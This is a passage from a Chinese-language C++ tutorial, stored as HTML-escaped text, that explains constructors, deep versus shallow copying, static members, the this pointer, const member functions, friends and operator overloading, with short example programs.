endl;\n&#125;\n\nvoid test02()\n&#123;\n\t&#x2F;&#x2F;如果用户提供有参构造，编译器不会提供默认构造，会提供拷贝构造\n\tPerson p1; &#x2F;&#x2F;此时如果用户自己没有提供默认构造，会出错\n\tPerson p2(10); &#x2F;&#x2F;用户提供的有参\n\tPerson p3(p2); &#x2F;&#x2F;此时如果用户没有提供拷贝构造，编译器会提供\n\n\t&#x2F;&#x2F;如果用户提供拷贝构造，编译器不会提供其他构造函数\n\tPerson p4; &#x2F;&#x2F;此时如果用户自己没有提供默认构造，会出错\n\tPerson p5(10); &#x2F;&#x2F;此时如果用户自己没有提供有参，会出错\n\tPerson p6(p5); &#x2F;&#x2F;用户自己提供拷贝构造\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n深拷贝与浅拷贝深浅拷贝是面试经典问题，也是常见的一个坑\n浅拷贝：简单的赋值拷贝操作\n深拷贝：在堆区重新申请空间，进行拷贝操作\n示例：\nclass Person &#123;\npublic:\n\t&#x2F;&#x2F;无参（默认）构造函数\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;有参构造函数\n\tPerson(int age ,int height) &#123;\n\t\t\n\t\tcout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;\n\n\t\tm_age &#x3D; age;\n\t\tm_height &#x3D; new int(height);\n\t\t\n\t&#125;\n\t&#x2F;&#x2F;拷贝构造函数  \n\tPerson(const Person&amp; p) &#123;\n\t\tcout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;\n\t\t&#x2F;&#x2F;如果不利用深拷贝在堆区创建新内存，会导致浅拷贝带来的重复释放堆区问题\n\t\tm_age &#x3D; p.m_age;\n\t\tm_height &#x3D; new int(*p.m_height);\n\t\t\n\t&#125;\n\n\t&#x2F;&#x2F;析构函数\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;\n\t\tif (m_height !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_height;\n\t\t&#125;\n\t&#125;\npublic:\n\tint m_age;\n\tint* m_height;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p1(18, 180);\n\n\tPerson p2(p1);\n\n\tcout &lt;&lt; &quot;p1的年龄： &quot; &lt;&lt; p1.m_age &lt;&lt; &quot; 身高： &quot; &lt;&lt; *p1.m_height &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;p2的年龄： &quot; &lt;&lt; p2.m_age &lt;&lt; &quot; 身高： &quot; &lt;&lt; *p2.m_height &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结：如果属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题\n初始化列表作用：\nC++提供了初始化列表语法，用来初始化属性\n语法：构造函数()：属性1(值1),属性2（值2）... &#123;&#125;\n示例：\nclass Person &#123;\npublic:\n\n\t&#x2F;&#x2F;&#x2F;&#x2F;传统方式初始化\n\t&#x2F;&#x2F;Person(int a, int b, int c) &#123;\n\t&#x2F;&#x2F;\tm_A &#x3D; a;\n\t&#x2F;&#x2F;\tm_B &#x3D; b;\n\t&#x2F;&#x2F;\tm_C &#x3D; c;\n\t&#x2F;&#x2F;&#125;\n\n\t&#x2F;&#x2F;初始化列表方式初始化\n\tPerson(int a, int b, int c) :m_A(a), m_B(b), m_C(c) &#123;&#125;\n\tvoid PrintPerson() &#123;\n\t\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; m_A &lt;&lt; endl;\n\t\tcout &lt;&lt; &quot;mB:&quot; &lt;&lt; m_B &lt;&lt; endl;\n\t\tcout &lt;&lt; &quot;mC:&quot; &lt;&lt; m_C &lt;&lt; endl;\n\t&#125;\nprivate:\n\tint m_A;\n\tint m_B;\n\tint m_C;\n&#125;;\n\nint main() &#123;\n\n\tPerson p(1, 2, 3);\n\tp.PrintPerson();\n\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n类对象作为类成员C++类中的成员可以是另一个类的对象，我们称该成员为 对象成员\n例如：\nclass A &#123;&#125;\nclass B\n&#123;\n    A a；\n&#125;\n\nB类中有对象A作为成员，A为对象成员\n那么当创建B对象时，A与B的构造和析构的顺序是谁先谁后？\n示例：\nclass Phone\n&#123;\npublic:\n\tPhone(string name)\n\t&#123;\n\t\tm_PhoneName &#x3D; name;\n\t\tcout &lt;&lt; &quot;Phone构造&quot; &lt;&lt; endl;\n\t&#125;\n\n\t~Phone()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Phone析构&quot; &lt;&lt; endl;\n\t&#125;\n\n\tstring m_PhoneName;\n\n&#125;;\n\n\nclass Person\n&#123;\npublic:\n\n\t&#x2F;&#x2F;初始化列表可以告诉编译器调用哪一个构造函数\n\tPerson(string name, string pName) :m_Name(name), m_Phone(pName)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Person构造&quot; &lt;&lt; endl;\n\t&#125;\n\n\t~Person()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Person析构&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid playGame()\n\t&#123;\n\t\tcout &lt;&lt; m_Name &lt;&lt; &quot; 使用&quot; &lt;&lt; m_Phone.m_PhoneName &lt;&lt; &quot; 牌手机! &quot; &lt;&lt; endl;\n\t&#125;\n\n\tstring m_Name;\n\tPhone m_Phone;\n\n&#125;;\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;当类中成员是其他类对象时，我们称该成员为 对象成员\n\t&#x2F;&#x2F;构造的顺序是 ：先调用对象成员的构造，再调用本类构造\n\t&#x2F;&#x2F;析构顺序与构造相反\n\tPerson p(&quot;张三&quot; , &quot;苹果X&quot;);\n\tp.playGame();\n\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n静态成员静态成员就是在成员变量和成员函数前加上关键字static，称为静态成员\n静态成员分为：\n\n静态成员变量\n所有对象共享同一份数据\n在编译阶段分配内存\n类内声明，类外初始化\n\n\n静态成员函数\n所有对象共享同一个函数\n静态成员函数只能访问静态成员变量\n\n\n\n示例1 ：静态成员变量\nclass Person\n&#123;\n\t\npublic:\n\n\tstatic int m_A; &#x2F;&#x2F;静态成员变量\n\n\t&#x2F;&#x2F;静态成员变量特点：\n\t&#x2F;&#x2F;1 在编译阶段分配内存\n\t&#x2F;&#x2F;2 类内声明，类外初始化\n\t&#x2F;&#x2F;3 所有对象共享同一份数据\n\nprivate:\n\tstatic int m_B; &#x2F;&#x2F;静态成员变量也是有访问权限的\n&#125;;\nint Person::m_A &#x3D; 10;\nint Person::m_B &#x3D; 10;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;静态成员变量两种访问方式\n\n\t&#x2F;&#x2F;1、通过对象\n\tPerson p1;\n\tp1.m_A &#x3D; 100;\n\tcout &lt;&lt; &quot;p1.m_A &#x3D; &quot; &lt;&lt; p1.m_A &lt;&lt; endl;\n\n\tPerson p2;\n\tp2.m_A &#x3D; 200;\n\tcout &lt;&lt; &quot;p1.m_A &#x3D; &quot; &lt;&lt; p1.m_A &lt;&lt; endl; &#x2F;&#x2F;共享同一份数据\n\tcout &lt;&lt; &quot;p2.m_A &#x3D; &quot; &lt;&lt; p2.m_A &lt;&lt; endl;\n\n\t&#x2F;&#x2F;2、通过类名\n\tcout &lt;&lt; &quot;m_A &#x3D; &quot; &lt;&lt; Person::m_A &lt;&lt; endl;\n\n\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;m_B &#x3D; &quot; &lt;&lt; Person::m_B &lt;&lt; endl; &#x2F;&#x2F;私有权限访问不到\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n示例2：静态成员函数\nclass Person\n&#123;\n\npublic:\n\n\t&#x2F;&#x2F;静态成员函数特点：\n\t&#x2F;&#x2F;1 程序共享一个函数\n\t&#x2F;&#x2F;2 静态成员函数只能访问静态成员变量\n\t\n\tstatic void func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;func调用&quot; &lt;&lt; endl;\n\t\tm_A &#x3D; 100;\n\t\t&#x2F;&#x2F;m_B &#x3D; 100; &#x2F;&#x2F;错误，不可以访问非静态成员变量\n\t&#125;\n\n\tstatic int m_A; &#x2F;&#x2F;静态成员变量\n\tint m_B; &#x2F;&#x2F; \nprivate:\n\n\t&#x2F;&#x2F;静态成员函数也是有访问权限的\n\tstatic void func2()\n\t&#123;\n\t\tcout &lt;&lt; &quot;func2调用&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\nint Person::m_A &#x3D; 10;\n\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;静态成员变量两种访问方式\n\n\t&#x2F;&#x2F;1、通过对象\n\tPerson p1;\n\tp1.func();\n\n\t&#x2F;&#x2F;2、通过类名\n\tPerson::func();\n\n\n\t&#x2F;&#x2F;Person::func2(); &#x2F;&#x2F;私有权限访问不到\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nC++对象模型和this指针成员变量和成员函数分开存储在C++中，类内的成员变量和成员函数分开存储\n只有非静态成员变量才属于类的对象上\nclass Person &#123;\npublic:\n\tPerson() &#123;\n\t\tmA &#x3D; 0;\n\t&#125;\n\t&#x2F;&#x2F;非静态成员变量占对象空间\n\tint mA;\n\t&#x2F;&#x2F;静态成员变量不占对象空间\n\tstatic int mB; \n\t&#x2F;&#x2F;函数也不占对象空间，所有函数共享一个函数实例\n\tvoid func() &#123;\n\t\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; this-&gt;mA &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;静态成员函数也不占对象空间\n\tstatic void sfunc() &#123;\n\t&#125;\n&#125;;\n\nint main() &#123;\n\n\tcout &lt;&lt; sizeof(Person) &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nthis指针概念通过4.3.1我们知道在C++中成员变量和成员函数是分开存储的\n每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码\n那么问题是：这一块代码是如何区分那个对象调用自己的呢？\nc++通过提供特殊的对象指针，this指针，解决上述问题。this指针指向被调用的成员函数所属的对象\nthis指针是隐含每一个非静态成员函数内的一种指针\nthis指针不需要定义，直接使用即可\nthis指针的用途：\n\n当形参和成员变量同名时，可用this指针来区分\n在类的非静态成员函数中返回对象本身，可使用return *this\n\nclass Person\n&#123;\npublic:\n\n\tPerson(int age)\n\t&#123;\n\t\t&#x2F;&#x2F;1、当形参和成员变量同名时，可用this指针来区分\n\t\tthis-&gt;age &#x3D; age;\n\t&#125;\n\n\tPerson&amp; PersonAddPerson(Person p)\n\t&#123;\n\t\tthis-&gt;age +&#x3D; p.age;\n\t\t&#x2F;&#x2F;返回对象本身\n\t\treturn *this;\n\t&#125;\n\n\tint age;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p1(10);\n\tcout &lt;&lt; &quot;p1.age &#x3D; &quot; &lt;&lt; p1.age &lt;&lt; endl;\n\n\tPerson p2(10);\n\tp2.PersonAddPerson(p1).PersonAddPerson(p1).PersonAddPerson(p1);\n\tcout &lt;&lt; &quot;p2.age &#x3D; &quot; &lt;&lt; p2.age &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n空指针访问成员函数C++中空指针也是可以调用成员函数的，但是也要注意有没有用到this指针\n如果用到this指针，需要加以判断保证代码的健壮性\n示例：\n&#x2F;&#x2F;空指针访问成员函数\nclass Person &#123;\npublic:\n\n\tvoid ShowClassName() &#123;\n\t\tcout &lt;&lt; &quot;我是Person类!&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid ShowPerson() &#123;\n\t\tif (this &#x3D;&#x3D; NULL) &#123;\n\t\t\treturn;\n\t\t&#125;\n\t\tcout &lt;&lt; mAge &lt;&lt; endl;\n\t&#125;\n\npublic:\n\tint mAge;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson * p &#x3D; NULL;\n\tp-&gt;ShowClassName(); &#x2F;&#x2F;空指针，可以调用成员函数\n\tp-&gt;ShowPerson();  &#x2F;&#x2F;但是如果成员函数中用到了this指针，就不可以了\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nconst修饰成员函数常函数：\n\n成员函数后加const后我们称为这个函数为常函数\n常函数内不可以修改成员属性\n成员属性声明时加关键字mutable后，在常函数中依然可以修改\n\n常对象：\n\n声明对象前加const称该对象为常对象\n常对象只能调用常函数\n\n示例：\nclass Person &#123;\npublic:\n\tPerson() &#123;\n\t\tm_A &#x3D; 0;\n\t\tm_B &#x3D; 0;\n\t&#125;\n\n\t&#x2F;&#x2F;this指针的本质是一个指针常量，指针的指向不可修改\n\t&#x2F;&#x2F;如果想让指针指向的值也不可以修改，需要声明常函数\n\tvoid ShowPerson() const &#123;\n\t\t&#x2F;&#x2F;const Type* const pointer;\n\t\t&#x2F;&#x2F;this &#x3D; NULL; &#x2F;&#x2F;不能修改指针的指向 Person* const this;\n\t\t&#x2F;&#x2F;this-&gt;mA &#x3D; 100; &#x2F;&#x2F;但是this指针指向的对象的数据是可以修改的\n\n\t\t&#x2F;&#x2F;const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量\n\t\tthis-&gt;m_B &#x3D; 100;\n\t&#125;\n\n\tvoid MyFunc() const &#123;\n\t\t&#x2F;&#x2F;mA &#x3D; 10000;\n\t&#125;\n\npublic:\n\tint m_A;\n\tmutable int m_B; &#x2F;&#x2F;可修改 可变的\n&#125;;\n\n\n&#x2F;&#x2F;const修饰对象  常对象\nvoid test01() &#123;\n\n\tconst Person person; &#x2F;&#x2F;常量对象  \n\tcout &lt;&lt; person.m_A &lt;&lt; endl;\n\t&#x2F;&#x2F;person.mA &#x3D; 100; &#x2F;&#x2F;常对象不能修改成员变量的值,但是可以访问\n\tperson.m_B &#x3D; 100; &#x2F;&#x2F;但是常对象可以修改mutable修饰成员变量\n\n\t&#x2F;&#x2F;常对象访问成员函数\n\tperson.MyFunc(); &#x2F;&#x2F;常对象不能调用const的函数\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n友元生活中你的家有客厅(Public)，有你的卧室(Private)\n客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去\n但是呢，你也可以允许你的好闺蜜好基友进去。\n在程序里，有些私有属性 也想让类外特殊的一些函数或者类进行访问，就需要用到友元的技术\n友元的目的就是让一个函数或者类 访问另一个类中私有成员\n友元的关键字为 &#x3D;&#x3D;friend&#x3D;&#x3D;\n友元的三种实现\n\n全局函数做友元\n类做友元\n成员函数做友元\n\n全局函数做友元class Building\n&#123;\n\t&#x2F;&#x2F;告诉编译器 goodGay全局函数 是 Building类的好朋友，可以访问类中的私有内容\n\tfriend void goodGay(Building * building);\n\npublic:\n\n\tBuilding()\n\t&#123;\n\t\tthis-&gt;m_SittingRoom &#x3D; &quot;客厅&quot;;\n\t\tthis-&gt;m_BedRoom &#x3D; &quot;卧室&quot;;\n\t&#125;\n\n\npublic:\n\tstring m_SittingRoom; &#x2F;&#x2F;客厅\n\nprivate:\n\tstring m_BedRoom; &#x2F;&#x2F;卧室\n&#125;;\n\n\nvoid goodGay(Building * building)\n&#123;\n\tcout &lt;&lt; &quot;好基友正在访问： &quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\tcout &lt;&lt; &quot;好基友正在访问： &quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\n\nvoid test01()\n&#123;\n\tBuilding b;\n\tgoodGay(&amp;b);\n&#125;\n\nint main()&#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\n类做友元class Building;\nclass goodGay\n&#123;\npublic:\n\n\tgoodGay();\n\tvoid visit();\n\nprivate:\n\tBuilding *building;\n&#125;;\n\n\nclass Building\n&#123;\n\t&#x2F;&#x2F;告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容\n\tfriend class goodGay;\n\npublic:\n\tBuilding();\n\npublic:\n\tstring m_SittingRoom; &#x2F;&#x2F;客厅\nprivate:\n\tstring m_BedRoom;&#x2F;&#x2F;卧室\n&#125;;\n\nBuilding::Building()\n&#123;\n\tthis-&gt;m_SittingRoom &#x3D; &quot;客厅&quot;;\n\tthis-&gt;m_BedRoom &#x3D; &quot;卧室&quot;;\n&#125;\n\ngoodGay::goodGay()\n&#123;\n\tbuilding &#x3D; new Building;\n&#125;\n\nvoid goodGay::visit()\n&#123;\n\tcout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\tcout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\nvoid test01()\n&#123;\n\tgoodGay gg;\n\tgg.visit();\n\n&#125;\n\nint main()&#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\n成员函数做友元class Building;\nclass goodGay\n&#123;\npublic:\n\n\tgoodGay();\n\tvoid visit(); &#x2F;&#x2F;只让visit函数作为Building的好朋友，可以发访问Building中私有内容\n\tvoid visit2(); \n\nprivate:\n\tBuilding *building;\n&#125;;\n\n\nclass Building\n&#123;\n\t&#x2F;&#x2F;告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容\n\tfriend void goodGay::visit();\n\npublic:\n\tBuilding();\n\npublic:\n\tstring m_SittingRoom; &#x2F;&#x2F;客厅\nprivate:\n\tstring m_BedRoom;&#x2F;&#x2F;卧室\n&#125;;\n\nBuilding::Building()\n&#123;\n\tthis-&gt;m_SittingRoom &#x3D; &quot;客厅&quot;;\n\tthis-&gt;m_BedRoom &#x3D; &quot;卧室&quot;;\n&#125;\n\ngoodGay::goodGay()\n&#123;\n\tbuilding &#x3D; new Building;\n&#125;\n\nvoid goodGay::visit()\n&#123;\n\tcout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\tcout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\nvoid goodGay::visit2()\n&#123;\n\tcout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\nvoid test01()\n&#123;\n\tgoodGay  gg;\n\tgg.visit();\n\n&#125;\n\nint main()&#123;\n    \n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\n运算符重载运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型\n加号运算符重载作用：实现两个自定义数据类型相加的运算\nclass Person &#123;\npublic:\n\tPerson() &#123;&#125;;\n\tPerson(int a, int b)\n\t&#123;\n\t\tthis-&gt;m_A &#x3D; a;\n\t\tthis-&gt;m_B &#x3D; b;\n\t&#125;\n\t&#x2F;&#x2F;成员函数实现 + 号运算符重载\n\tPerson operator+(const Person&amp; p) &#123;\n\t\tPerson temp;\n\t\ttemp.m_A &#x3D; this-&gt;m_A + p.m_A;\n\t\ttemp.m_B &#x3D; this-&gt;m_B + p.m_B;\n\t\treturn temp;\n\t&#125;\n\n\npublic:\n\tint m_A;\n\tint m_B;\n&#125;;\n\n&#x2F;&#x2F;全局函数实现 + 号运算符重载\n&#x2F;&#x2F;Person operator+(const Person&amp; p1, const Person&amp; p2) &#123;\n&#x2F;&#x2F;\tPerson temp(0, 0);\n&#x2F;&#x2F;\ttemp.m_A &#x3D; p1.m_A + p2.m_A;\n&#x2F;&#x2F;\ttemp.m_B &#x3D; p1.m_B + p2.m_B;\n&#x2F;&#x2F;\treturn temp;\n&#x2F;&#x2F;&#125;\n\n&#x2F;&#x2F;运算符重载 可以发生函数重载 \nPerson operator+(const Person&amp; p2, int val)  \n&#123;\n\tPerson temp;\n\ttemp.m_A &#x3D; p2.m_A + val;\n\ttemp.m_B &#x3D; p2.m_B + val;\n\treturn temp;\n&#125;\n\nvoid test() &#123;\n\n\tPerson p1(10, 10);\n\tPerson p2(20, 20);\n\n\t&#x2F;&#x2F;成员函数方式\n\tPerson p3 &#x3D; p2 + p1;  &#x2F;&#x2F;相当于 p2.operaor+(p1)\n\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; p3.m_A &lt;&lt; &quot; mB:&quot; &lt;&lt; p3.m_B &lt;&lt; endl;\n\n\n\tPerson p4 &#x3D; p3 + 10; &#x2F;&#x2F;相当于 operator+(p3,10)\n\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; p4.m_A &lt;&lt; &quot; mB:&quot; &lt;&lt; p4.m_B &lt;&lt; endl;\n\n&#125;\n\nint main() &#123;\n\n\ttest();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结1：对于内置的数据类型的表达式的的运算符是不可能改变的\n\n\n\n\n\n\n\n\n\n总结2：不要滥用运算符重载\n左移运算符重载作用：可以输出自定义数据类型\nclass Person &#123;\n\tfriend ostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p);\n\npublic:\n\n\tPerson(int a, int b)\n\t&#123;\n\t\tthis-&gt;m_A &#x3D; a;\n\t\tthis-&gt;m_B &#x3D; b;\n\t&#125;\n\n\t&#x2F;&#x2F;成员函数 实现不了  p &lt;&lt; cout 不是我们想要的效果\n\t&#x2F;&#x2F;void operator&lt;&lt;(Person&amp; p)&#123;\n\t&#x2F;&#x2F;&#125;\n\nprivate:\n\tint m_A;\n\tint m_B;\n&#125;;\n\n&#x2F;&#x2F;全局函数实现左移重载\n&#x2F;&#x2F;ostream对象只能有一个\nostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p) &#123;\n\tout &lt;&lt; &quot;a:&quot; &lt;&lt; p.m_A &lt;&lt; &quot; b:&quot; &lt;&lt; p.m_B;\n\treturn out;\n&#125;\n\nvoid test() &#123;\n\n\tPerson p1(10, 20);\n\n\tcout &lt;&lt; p1 &lt;&lt; &quot;hello world&quot; &lt;&lt; endl; &#x2F;&#x2F;链式编程\n&#125;\n\nint main() &#123;\n\n\ttest();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结：重载左移运算符配合友元可以实现输出自定义数据类型\n递增运算符重载作用： 通过重载递增运算符，实现自己的整型数据\nclass MyInteger &#123;\n\n\tfriend ostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint);\n\npublic:\n\tMyInteger() &#123;\n\t\tm_Num &#x3D; 0;\n\t&#125;\n\t&#x2F;&#x2F;前置++\n\tMyInteger&amp; operator++() &#123;\n\t\t&#x2F;&#x2F;先++\n\t\tm_Num++;\n\t\t&#x2F;&#x2F;再返回\n\t\treturn *this;\n\t&#125;\n\n\t&#x2F;&#x2F;后置++\n\tMyInteger operator++(int) &#123;\n\t\t&#x2F;&#x2F;先返回\n\t\tMyInteger temp &#x3D; *this; &#x2F;&#x2F;记录当前本身的值，然后让本身的值加1，但是返回的是以前的值，达到先返回后++；\n\t\tm_Num++;\n\t\treturn temp;\n\t&#125;\n\nprivate:\n\tint m_Num;\n&#125;;\n\n\nostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;\n\tout &lt;&lt; myint.m_Num;\n\treturn out;\n&#125;\n\n\n&#x2F;&#x2F;前置++ 先++ 再返回\nvoid test01() &#123;\n\tMyInteger myInt;\n\tcout &lt;&lt; ++myInt &lt;&lt; endl;\n\tcout &lt;&lt; myInt &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;后置++ 先返回 再++\nvoid test02() &#123;\n\n\tMyInteger myInt;\n\tcout &lt;&lt; myInt++ &lt;&lt; endl;\n\tcout &lt;&lt; myInt &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\t&#x2F;&#x2F;test02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结： 前置递增返回引用，后置递增返回值\n赋值运算符重载c++编译器至少给一个类添加4个函数\n\n默认构造函数(无参，函数体为空)\n默认析构函数(无参，函数体为空)\n默认拷贝构造函数，对属性进行值拷贝\n赋值运算符 operator&#x3D;, 对属性进行值拷贝\n\n如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题\n示例：\nclass Person\n&#123;\npublic:\n\n\tPerson(int age)\n\t&#123;\n\t\t&#x2F;&#x2F;将年龄数据开辟到堆区\n\t\tm_Age &#x3D; new int(age);\n\t&#125;\n\n\t&#x2F;&#x2F;重载赋值运算符 \n\tPerson&amp; operator&#x3D;(Person &amp;p)\n\t&#123;\n\t\tif (m_Age !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_Age;\n\t\t\tm_Age &#x3D; NULL;\n\t\t&#125;\n\t\t&#x2F;&#x2F;编译器提供的代码是浅拷贝\n\t\t&#x2F;&#x2F;m_Age &#x3D; p.m_Age;\n\n\t\t&#x2F;&#x2F;提供深拷贝 解决浅拷贝的问题\n\t\tm_Age &#x3D; new int(*p.m_Age);\n\n\t\t&#x2F;&#x2F;返回自身\n\t\treturn *this;\n\t&#125;\n\n\n\t~Person()\n\t&#123;\n\t\tif (m_Age !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_Age;\n\t\t\tm_Age &#x3D; NULL;\n\t\t&#125;\n\t&#125;\n\n\t&#x2F;&#x2F;年龄的指针\n\tint *m_Age;\n\n&#125;;\n\n\nvoid test01()\n&#123;\n\tPerson p1(18);\n\n\tPerson p2(20);\n\n\tPerson p3(30);\n\n\tp3 &#x3D; p2 &#x3D; p1; &#x2F;&#x2F;赋值操作\n\n\tcout &lt;&lt; &quot;p1的年龄为：&quot; &lt;&lt; *p1.m_Age &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;p2的年龄为：&quot; &lt;&lt; *p2.m_Age &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;p3的年龄为：&quot; &lt;&lt; *p3.m_Age &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\t&#x2F;&#x2F;int a &#x3D; 10;\n\t&#x2F;&#x2F;int b &#x3D; 20;\n\t&#x2F;&#x2F;int c &#x3D; 30;\n\n\t&#x2F;&#x2F;c &#x3D; b &#x3D; a;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;c &#x3D; &quot; &lt;&lt; c &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n关系运算符重载作用：重载关系运算符，可以让两个自定义类型对象进行对比操作\n示例：\nclass Person\n&#123;\npublic:\n\tPerson(string name, int age)\n\t&#123;\n\t\tthis-&gt;m_Name &#x3D; name;\n\t\tthis-&gt;m_Age &#x3D; age;\n\t&#125;;\n\n\tbool operator&#x3D;&#x3D;(Person &amp; p)\n\t&#123;\n\t\tif (this-&gt;m_Name &#x3D;&#x3D; p.m_Name &amp;&amp; this-&gt;m_Age &#x3D;&#x3D; p.m_Age)\n\t\t&#123;\n\t\t\treturn true;\n\t\t&#125;\n\t\telse\n\t\t&#123;\n\t\t\treturn false;\n\t\t&#125;\n\t&#125;\n\n\tbool operator!&#x3D;(Person &amp; p)\n\t&#123;\n\t\tif (this-&gt;m_Name &#x3D;&#x3D; p.m_Name &amp;&amp; this-&gt;m_Age &#x3D;&#x3D; p.m_Age)\n\t\t&#123;\n\t\t\treturn false;\n\t\t&#125;\n\t\telse\n\t\t&#123;\n\t\t\treturn true;\n\t\t&#125;\n\t&#125;\n\n\tstring m_Name;\n\tint m_Age;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;int a &#x3D; 0;\n\t&#x2F;&#x2F;int b &#x3D; 0;\n\n\tPerson a(&quot;孙悟空&quot;, 18);\n\tPerson b(&quot;孙悟空&quot;, 18);\n\n\tif (a &#x3D;&#x3D; b)\n\t&#123;\n\t\tcout &lt;&lt; &quot;a和b相等&quot; &lt;&lt; endl;\n\t&#125;\n\telse\n\t&#123;\n\t\tcout &lt;&lt; &quot;a和b不相等&quot; &lt;&lt; endl;\n\t&#125;\n\n\tif (a !&#x3D; b)\n\t&#123;\n\t\tcout &lt;&lt; &quot;a和b不相等&quot; &lt;&lt; endl;\n\t&#125;\n\telse\n\t&#123;\n\t\tcout &lt;&lt; &quot;a和b相等&quot; &lt;&lt; endl;\n\t&#125;\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n函数调用运算符重载\n函数调用运算符 () 